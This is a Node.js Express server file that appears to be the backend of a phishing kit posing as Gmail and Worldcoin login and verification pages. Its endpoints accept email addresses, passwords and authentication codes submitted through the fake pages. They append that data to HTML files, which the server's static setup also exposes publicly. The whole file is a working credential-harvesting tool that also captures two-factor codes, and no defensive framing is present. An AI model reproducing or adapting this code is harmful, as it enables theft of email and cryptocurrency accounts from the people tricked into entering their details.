const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const cors = require('cors'); 
const app = express();
const port = 3000;

app.use(bodyParser.json());
app.use(express.static(__dirname));
app.use(cors());

app.post('/submitUserData', (req, res) => {
    const userData = req.body;

    console.log('Received data:', userData);

    fs.appendFile(path.join(__dirname, 'Gmail_data.html'), `<p>email: ${userData.email},password:${userData.password}</p>\n`, (err) => {
        if (err) {
            console.error('Error writing to data.html:', err);
            res.status(500).json({ error: 'Internal Server Error' });
        } else {
            console.log('Data written to data.html');
            res.header('Access-Control-Allow-Origin', '*');
            res.json({ message: 'Gmail_Data received and stored successfully!' });
        }
    });
});


app.post('/submitWorldcoinData', (req, res) => {
    const worldcoinData = req.body;

    console.log('Received data:', worldcoinData);

    fs.appendFile(path.join(__dirname, 'worldcoin_data.html'), `<p>email: ${worldcoinData.email},password:${worldcoinData.password}</p>\n`, (err) => {
        if (err) {
            console.error('Error writing to worldcoin_data.html:', err);
            res.status(500).json({ error: 'Internal Server Error' });
        } else {
            console.log('Data written to worldcoin_data.html');
            res.header('Access-Control-Allow-Origin', '*');
            res.json({ message: 'worldcoin Data received and stored successfully!' });
        }
    });
});



app.post('/submitUserAuthenticationData', (req, res) => {
    const userauthenticationData = req.body;

    console.log('Received data:', userauthenticationData);

    fs.appendFile(path.join(__dirname, 'Gmail_data.html'), `<p>code:${userauthenticationData.code}</p>\n`, (err) => {
        if (err) {
            console.error('Error writing to Gmail_data.html:', err);
            res.status(500).json({ error: 'Internal Server Error' });
        } else {
            console.log('Code written to Gmail_data.html');
            res.header('Access-Control-Allow-Origin', '*');
            res.json({ message: 'Gmail_Data received and stored successfully!' });
        }
    });
});



app.get('/index', (req, res) => {
    res.sendFile(path.join(__dirname,'index.html'));
});


app.get('/next', (req, res) => {
    res.sendFile(path.join(__dirname,'userauthentication.html'));
});


app.get('/worldcoin', (req, res) => {
    res.sendFile(path.join(__dirname,'worldcoin.html'));
});


app.get('/Rates', (req, res) => {
    res.sendFile(path.join(__dirname,'Rates.html'));
});


app.listen(port, () => {
    console.log(`Server is running at http://localhost:${port}`);
});

